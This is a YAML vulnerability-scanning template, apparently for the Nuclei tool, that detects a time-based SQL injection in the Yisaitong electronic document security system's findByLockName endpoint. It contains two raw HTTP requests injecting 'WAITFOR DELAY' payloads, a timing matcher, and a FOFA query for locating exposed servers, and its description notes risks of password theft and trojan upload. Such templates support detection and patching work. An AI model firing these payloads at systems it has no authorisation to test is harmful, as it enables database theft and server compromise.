http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr HTTP/1.1
          Host: {{Hostname}}
          Content-Type: text/plain

          callCount=1
          page=/CDGServer3/dwr/test/JLockDao
          httpSessionId=
          scriptSessionId=
          c0-scriptName=JLockSeniorDao
          c0-methodName=findByLockName
          c0-id=0
          c0-param0=string:defaultKey1';WAITFOR DELAY '0:0:4'--
          batchId=0
        - |
          POST /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr HTTP/1.1
          Host: {{Hostname}}
          Content-Type: text/plain

          callCount=1
          page=/CDGServer3/dwr/test/JLockDao
          httpSessionId=
          scriptSessionId=
          c0-scriptName=JLockSeniorDao
          c0-methodName=findByLockName
          c0-id=0
          c0-param0=string:defaultKey1';WAITFOR DELAY '0:0:8'--
          batchId=0
id: yisaitong-CDG-findByLockName-sql
info:
    author: Superhero
    description: |-
        fofa: body="/CDGServer3/index.jsp"
        亿赛通电子文档安全管理系统findByLockName接口处存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 亿赛通电子文档安全管理系统 findByLockName SQL延时注入
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/141067188
    severity: high
    tags: []
